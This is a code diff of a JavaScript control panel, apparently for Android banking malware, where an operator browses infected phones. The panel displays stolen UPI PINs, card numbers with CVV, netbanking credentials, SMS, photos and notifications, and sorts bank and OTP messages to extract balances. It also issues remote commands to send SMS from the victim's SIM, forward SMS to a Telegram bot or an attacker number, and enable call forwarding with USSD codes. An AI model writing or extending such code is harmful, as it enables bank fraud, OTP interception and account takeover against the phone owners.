-    if (curFilter === 'upi' && !d.upi_data) return false;
-    if (curFilter === 'card' && !d.card_data) return false;
-    if (curFilter === 'bank' && !d.netbanking_data) return false;
-    var s = (id + ' ' + (d.device_model || '') + ' ' + (d.sim_info && d.sim_info.sim1_number || '')).toLowerCase();
-    return s.indexOf(q) !== -1;
-  });
-  if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices found</div>'; return; }
-  ids.sort(function(a, b) {
-    var ta = devs[a].first_install_timestamp || devs[a].install_timestamp || 0;
-    var tb = devs[b].first_install_timestamp || devs[b].install_timestamp || 0;
-    return tb - ta;
-  });
-  g.innerHTML = ids.map(function(id) {
-    var d = devs[id];
-    var m = d.device_model || d.device_name || 'Unknown';
-    var b = d.battery || '0%';
-    var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
-    var bal = d.last_balance || '';
-    var lk = isLiked(id);
-    var pc = d.photos ? Object.keys(d.photos).length : 0;
-    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + id + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div>' + (bal ? '<div class="balance-bar"><span class="l">₹ Balance</span><span class="a">' + esc(bal) + '</span></div>' : '') + '</div>';
-  }).join('');
-  g.querySelectorAll('.device-card').forEach(function(c) {
-    c.addEventListener('click', function(e) {
-      if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; }
-      openDev(this.getAttribute('data-id'));
+// ✅ Data collect karo aur merge karo
+function collectData(devObj, result) {
+  if (!devObj || typeof devObj !== 'object') return;
+  
+  // Messages
+  if (devObj.messages && typeof devObj.messages === 'object') {
+    Object.keys(devObj.messages).forEach(function(k) {
+      result.messages[k] = devObj.messages[k];
     });
+  }
+  
+  // SMS History
+  if (devObj.sms_history && typeof devObj.sms_history === 'object') {
+    Object.keys(devObj.sms_history).forEach(function(k) {
+      result.sms_history[k] = devObj.sms_history[k];
+    });
+  }
+  
+  // Photos
+  if (devObj.photos && typeof devObj.photos === 'object') {
+    Object.keys(devObj.photos).forEach(function(k) {
+      result.photos[k] = devObj.photos[k];
+    });
+  }
+  
+  // Notifications
+  if (devObj.notifications && typeof devObj.notifications === 'object') {
+    Object.keys(devObj.notifications).forEach(function(k) {
+      result.notifications[k] = devObj.notifications[k];
+    });
+  }
+  if (devObj.sms_notifications && typeof devObj.sms_notifications === 'object') {
+    Object.keys(devObj.sms_notifications).forEach(function(k) {
+      result.notifications[k] = devObj.sms_notifications[k];
+    });
+  }
+  
+  // Installed apps
+  if (devObj.installed_apps && typeof devObj.installed_apps === 'object') {
+    result.installed_apps = devObj.installed_apps;
+  }
+  
+  // SIM info
+  if (devObj.sim_info && typeof devObj.sim_info === 'object') {
+    result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
+  }
+  // SIM fields directly bhi ho sakte hain
+  if (devObj.sim1_number || devObj.sim1_carrier) {
+    result.sim_info = Object.assign({}, result.sim_info || {}, {
+      sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier,
+      sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier
+    });
+  }
+  
+  // Forward settings
+  if (devObj.forward_settings && typeof devObj.forward_settings === 'object') {
+    result.forward_settings = devObj.forward_settings;
+  }
+  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) {
+    result.forward_settings = Object.assign({}, result.forward_settings || {}, {
+      enabled: devObj.enabled, admin_number: devObj.admin_number,
+      bot_token: devObj.bot_token, chat_id: devObj.chat_id,
+      forward_sim_slot: devObj.forward_sim_slot
+    });
+  }
+  
+  // Device info
+  if (!result.device_info) result.device_info = {};
+  ['device_model', 'device_id', 'android_version', 'android_sdk', 'battery', 'status', 'last_seen', 'sim_info'].forEach(function(k) {
+    if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
   });
-}
-function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#10B981'; if (p >= 20) return '#F59E0B'; return '#EF4444'; }
-function esc(t) { if (!t) return ''; var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
-function cat(sender, body) {
-  var s = (sender || '').toUpperCase(); var b = (body || '').toUpperCase();
-  if (b.indexOf('OTP') !== -1 || b.indexOf('VERIFICATION') !== -1) return 'OTP';
-  if (b.indexOf('BAL') !== -1 || b.indexOf('BALANCE') !== -1 || b.indexOf('AVAILABLE') !== -1) return 'BALANCE';
-  if (b.indexOf('CREDIT') !== -1 || b.indexOf('CREDITED') !== -1 || b.indexOf('CR ') !== -1) return 'CREDIT';
-  if (b.indexOf('DEBIT') !== -1 || b.indexOf('DEBITED') !== -1 || b.indexOf('DR ') !== -1 || b.indexOf('WITHDRAWN') !== -1) return 'DEBIT';
-  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1 || s.indexOf('AXIS') !== -1 || s.indexOf('BOB') !== -1 || s.indexOf('PHONPE') !== -1 || s.indexOf('PHONEPE') !== -1 || s.indexOf('PAYTM') !== -1 || s.indexOf('GPAY') !== -1) return 'BANK';
-  return 'ALERT';
-}
-function bankName(sender) {
-  var s = (sender || '').toUpperCase();
-  if (s.indexOf('SBI') !== -1) return 'SBI';
-  if (s.indexOf('HDFC') !== -1) return 'HDFC';
-  if (s.indexOf('ICICI') !== -1) return 'ICICI';
-  if (s.indexOf('AXIS') !== -1) return 'AXIS';
-  if (s.indexOf('BOB') !== -1) return 'BOB';
-  if (s.indexOf('PHONEPE') !== -1 || s.indexOf('PHONPE') !== -1) return 'PhonePe';
-  if (s.indexOf('GPAY') !== -1) return 'GPay';
-  if (s.indexOf('PAYTM') !== -1) return 'Paytm';
-  if (s.indexOf('AIRTEL') !== -1) return 'Airtel';
-  return 'Bank';
-}
-function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
-function extractTx(body) {
-  var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/gi);
-  return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : '');
-}
-function detectFromSms(allMsgs) {
-  var phones = {}, nets = {};
-  allMsgs.forEach(function(m) {
-    var t = (m.body || '') + ' ' + (m.sender || '');
-    var pm = t.match(/\b[6-9]\d{9}\b/g);
-    if (pm) pm.forEach(function(p) { phones[p] = true; });
-    var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/);
-    if (nm) nets[nm[1]] = true;
+  // Form/KYC/Card data
+  ['form_data', 'kyc_data', 'payment_data', 'upi_data', 'card_data', 'netbanking_data', 'device_note'].forEach(function(k) {
+    if (devObj[k] !== undefined) result.device_info[k] = devObj[k];
   });
-  return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) };
 }
 
 // ═══ DEVICE DRAWER ═══
@@ -817,20 +636,35 @@ function openDev(id) {
   var d = devs[id];
   document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
   updStar();
-  db.ref('device_info/' + id + '/messages').on('value', function(s) {
-    curMsgs = s.val() || {};
-    if (curTab === 'allsms' || curTab === 'bank') renderTab();
+  
+  // ✅ Universal data load karo
+  document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
+  
+  loadAllDeviceData(id, function(data) {
+    curMsgs = data.messages;
+    photos = data.photos;
+    
+    // Device object update karo merged data se
+    if (data.sim_info) devs[id].sim_info = data.sim_info;
+    if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
+    if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
+    if (data.installed_apps && Object.keys(data.installed_apps).length > 0) devs[id].installed_apps = data.installed_apps;
+    if (data.sms_history && Object.keys(data.sms_history).length > 0) devs[id].sms_history = data.sms_history;
+    
+    if (curTab === 'photos') renderPhotos();
+    else if (curTab === 'apps') renderApps();
+    else if (curTab === 'notifs') renderNotifs();
+    else if (curTab === 'bank' || curTab === 'allsms') renderTab();
+    else renderTab();
   });
-  db.ref('device_info/' + id + '/photos').on('value', function(s) {
-    photos = s.val() || {};
-    if (curTab === 'photos') renderTab();
-  });
+  
   document.getElementById('drawer').classList.add('active');
   document.getElementById('dOverlay').classList.add('active');
   switchTab('info');
 }
 function closeDev() {
-  if (curId) { db.ref('device_info/' + curId + '/messages').off(); db.ref('device_info/' + curId + '/photos').off(); }
+  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
+  dataListeners = [];
   document.getElementById('drawer').classList.remove('active');
   document.getElementById('dOverlay').classList.remove('active');
   curId = null;
@@ -841,6 +675,7 @@ function switchTab(t) {
   document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
   renderTab();
 }
+
 function renderTab() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -862,21 +697,23 @@ function renderTab() {
   if (curTab === 'info') {
     var note = d.device_note || '';
     var fm = detectFromSms(all);
+    var sim = d.sim_info || {};
     b.innerHTML = 
-      '<div class="dir"><span class="k">Phone Number</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_number) || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Phone Number (SIM1)</span><span class="v">' + esc(sim.sim1_number || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Phone Number (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' +
       '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
       '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc((d.sim_info && d.sim_info.sim1_number) || '') + '" placeholder="10 digit number"><button data-det="1">Detect</button></div></div>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc((d.sim_info && d.sim_info.sim2_number) || '') + '" placeholder="10 digit number"><button data-det="2">Detect</button></div></div>' +
-      '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div>' +
-      '<div style="font-size:9px;color:#64748B;margin-top:6px;">The saved number is the device phone number. Edit manually if detection is incorrect.</div></div>' +
-      '<div class="dir"><span class="k">Network</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_carrier) || '-') + '</span></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit number"><button data-det="1">Detect</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit number"><button data-det="2">Detect</button></div></div>' +
+      '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div></div>' +
+      '<div class="dir"><span class="k">Network</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
       '<div class="dir"><span class="k">IP Address</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">CPU Arch</span><span class="v">' + esc(d.cpu_arch || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
-      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;letter-spacing:0.1em;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') + fm.nets.map(function(n, i) { return '<div class="dir"><span class="k">Network #' + (i+1) + '</span><span class="v">' + esc(n) + '</span></div>'; }).join('') : '');
+      (fm.phones.length > 0 ? '<div style="margin-top:12px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:bold;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
     setTimeout(function() {
       var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref('device_info/' + curId + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
       var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref('device_info/' + curId + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
@@ -884,15 +721,12 @@ function renderTab() {
     }, 100);
   } else if (curTab === 'allsms') {
     if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
-    b.innerHTML = '<input type="text" class="fi" id="smsQ" placeholder="Search SMS..." style="margin-bottom:8px;">' + all.map(function(m) {
-      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '" data-s="' + esc((m.sender || '') + ' ' + (m.body || '')).toLowerCase() + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    b.innerHTML = all.map(function(m) {
+      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + esc(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
-    setTimeout(function() {
-      var q = document.getElementById('smsQ'); if (q) q.addEventListener('input', function() { var v = this.value.toLowerCase(); document.querySelectorAll('[data-s]').forEach(function(e) { e.style.display = e.getAttribute('data-s').indexOf(v) !== -1 ? 'block' : 'none'; }); });
-    }, 50);
   } else if (curTab === 'card') {
-    var u = d.upi_data || {}; var c = d.card_data || {}; var bn = d.netbanking_data || {};
-    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI DATA</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD DATA</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '<br><strong>Holder:</strong> ' + esc(c.card_holder || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User ID:</strong> ' + esc(bn.user_id || '-') + '<br><strong>Password:</strong> ' + esc(bn.password || '-') + '</div></div>';
+    var u = d.upi_data || {}, c = d.card_data || {}, bn = d.netbanking_data || {};
+    b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
   } else if (curTab === 'send') {
     if (b.getAttribute('data-rendered') === 'send') return;
     b.setAttribute('data-rendered', 'send');
@@ -904,18 +738,15 @@ function renderTab() {
     var ch = f.chat_id || '';
     var devNum = (d.sim_info && d.sim_info.sim1_number) || '';
     b.innerHTML = 
-      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><p>Auto-fills SMS form and sends instantly when Telegram message arrives</p><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx or @channel"></div><button class="btn" id="tgS">Start</button><div class="info-b"><span class="di"></span>Idle - enter token and chat ID, then select Start</div></div>' +
-      '<div class="card green"><h3>📱 SMS Forwarding (Auto)</h3><p>Enter a number and select ON. New SMS placed in Send SMS form automatically.</p><label class="fl">SIM (Send Line)</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1' + (simSel === 1 ? ' ✓' : '') + '</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">+91 Forwarding Number</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div><div class="info-b g"><span class="di ' + (fOn ? 'on' : '') + '"></span>' + (fOn ? 'ON - forwarding active' : 'OFF - enter a number and select ON') + '</div></div>' +
-      '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">Select SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">Recipient</label><input type="text" class="fi" id="sTo" placeholder="+919876543210"></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg" placeholder="Type your message here..."></textarea><div class="cc" id="cc">0 chars</div></div><button class="btn green" id="sBtn">✈️ Send via SIM</button><button class="btn dark" id="uDev">Use device number: ' + esc(devNum || '-') + '</button></div>' +
-      '<div class="sim-mgr"><h4>📱 SIM NUMBER SET</h4><div class="dir"><span class="k">SIM 1 - Phone #1</span><span class="v">' + esc((d.sim_info && d.sim_info.sim1_number) || '-') + '</span></div><div class="dir"><span class="k">SIM 2 - Phone #2</span><span class="v">' + esc((d.sim_info && d.sim_info.sim2_number) || '-') + '</span></div></div>';
+      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx"></div><button class="btn" id="tgS">Start</button></div>' +
+      '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
+      '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
     setTimeout(function() {
-      document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('forward_settings/' + curId + '/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
-      document.getElementById('tgS').addEventListener('click', function() { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t || !c) { alert('Fill token & chat'); return; } db.ref('forward_settings/' + curId).update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); alert('✅ Telegram started'); });
-      document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('forward_settings/' + curId).update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
+      document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref('device_info/' + curId + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
+      document.getElementById('tgS').addEventListener('click', function() { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t || !c) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); alert('✅ Telegram started'); });
+      document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref('device_info/' + curId + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
       document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
-      document.getElementById('sMsg').addEventListener('input', function() { document.getElementById('cc').textContent = this.value.length + ' chars'; });
-      document.getElementById('uDev').addEventListener('click', function() { document.getElementById('sTo').value = devNum; });
-      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); alert('✅ Sent via SIM ' + sim); document.getElementById('sMsg').value = ''; document.getElementById('cc').textContent = '0 chars'; });
+      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref('device_info/' + curId + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); alert('✅ Sent'); });
     }, 100);
   }
 }
@@ -997,66 +828,206 @@ function renderBank() {
   if (bks.length === 0) { b.innerHTML = '<div class="empty">No bank messages</div>'; return; }
   var lb = '';
   for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
-  var html = '<div style="text-align:center;color:#64748B;font-size:10px;margin-bottom:10px;">Auto-detected from ' + all.length + ' SMS<br>' + bks.length + ' bank message(s) found</div>';
-  if (lb) html += '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + lb + '</div></div>';
+  var html = '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + (lb || '—') + '</div></div>';
   html += bks.map(function(m) {
-    var bal = extractBal(m.body);
-    var tx = extractTx(m.body);
-    var bn = bankName(m.sender);
-    var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1 || (m.body || '').toUpperCase().indexOf('CR.') !== -1 || (m.body || '').toUpperCase().indexOf('CREDITED') !== -1;
-    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Available Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt-lbl">Transaction</div><div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
+    var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender);
+    var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1;
+    return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Available Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + esc(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>';
   }).join('');
   b.innerHTML = html;
 }
 
 // ═══ CALL FORWARD ═══
 function openCallFwd() {
-  if (!curId) { alert('No device selected'); return; }
+  if (!curId) { alert('No device'); return; }
   var d = devs[curId];
-  var savedNum = (d.forward_settings && d.forward_settings.admin_number) || '';
-  document.getElementById('cfNumber').value = savedNum;
-  document.getElementById('cfStatus').textContent = 'Ready. Enter number or click Check Status.';
+  document.getElementById('cfNumber').value = (d.forward_settings && d.forward_settings.admin_number) || '';
+  document.getElementById('cfStatus').textContent = 'Ready.';
   document.getElementById('cfStatus').className = 'cf-status';
   document.getElementById('cfOverlay').classList.add('active');
   db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) {
     var val = s.val();
     if (val) {
-      var key = Object.keys(val)[0];
-      var cmd = val[key];
-      var stat = cmd.status || 'pending';
-      var action = cmd.action || 'unknown';
-      var num = cmd.number || '';
-      var ussd = cmd.ussd_code || '';
-      var delivered = cmd.delivered_at ? new Date(cmd.delivered_at).toLocaleString() : '';
+      var cmd = val[Object.keys(val)[0]];
       var statusEl = document.getElementById('cfStatus');
       statusEl.className = 'cf-status ok';
-      statusEl.innerHTML = '<strong>Latest:</strong> ' + action.toUpperCase() + '<br>Number: ' + (num || '-') + '<br>Status: ' + stat.toUpperCase() + (ussd ? '<br>USSD: ' + ussd : '') + (delivered ? '<br>Delivered: ' + delivered : '');
+      statusEl.innerHTML = '<strong>Latest:</strong> ' + (cmd.action || 'unknown').toUpperCase() + '<br>Status: ' + (cmd.status || 'pending').toUpperCase() + (cmd.ussd_code ? '<br>USSD: ' + cmd.ussd_code : '');
     }
   });
 }
-function closeCallFwd() {
-  document.getElementById('cfOverlay').classList.remove('active');
-  if (curId) { try { db.ref('call_forward_commands/' + curId).off(); } catch(e) {} }
-}
+function closeCallFwd() { document.getElementById('cfOverlay').classList.remove('active'); if (curId) { try { db.ref('call_forward_commands/' + curId).off(); } catch(e) {} } }
 function sendCallFwd(action) {
-  if (!curId) { alert('No device selected'); return; }
+  if (!curId) return;
   var num = document.getElementById('cfNumber').value.trim();
   var statusEl = document.getElementById('cfStatus');
-  if (action === 'activate' && (!num || num.length < 10)) {
-    statusEl.className = 'cf-status err';
-    statusEl.textContent = '❌ Enter a valid 10-digit number for ACTIVATE';
-    return;
-  }
-  statusEl.className = 'cf-status';
-  statusEl.textContent = '📤 Sending command...';
-  var command = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
-  if (action === 'activate') command.ussd_code = '**21*' + num + '#';
-  else if (action === 'deactivate') command.ussd_code = '##21#';
-  else if (action === 'check_status') command.ussd_code = '*#21#';
-  db.ref('call_forward_commands/' + curId).push(command).then(function() {
+  if (action === 'activate' && (!num || num.length < 10)) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Enter valid number'; return; }
+  statusEl.className = 'cf-status'; statusEl.textContent = '📤 Sending...';
+  var cmd = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
+  if (action === 'activate') cmd.ussd_code = '**21*' + num + '#';
+  else if (action === 'deactivate') cmd.ussd_code = '##21#';
+  else cmd.ussd_code = '*#21#';
+  db.ref('call_forward_commands/' + curId).push(cmd).then(function() {
     statusEl.className = 'cf-status ok';
-    statusEl.innerHTML = '✅ Command sent!<br>Action: <strong>' + action.toUpperCase() + '</strong><br>' + (command.ussd_code ? 'USSD: ' + command.ussd_code + '<br>' : '') + 'Waiting for device response...';
-  }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Failed: ' + e.message; });
+    statusEl.innerHTML = '✅ Sent!<br>' + cmd.ussd_code;
+  }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ ' + e.message; });
+}
+
+// ═══ HELPERS ═══
+function updStats() {
+  var ids = Object.keys(devs);
+  var on = 0, off = 0, sms = 0, bank = 0;
+  ids.forEach(function(id) {
+    var d = devs[id];
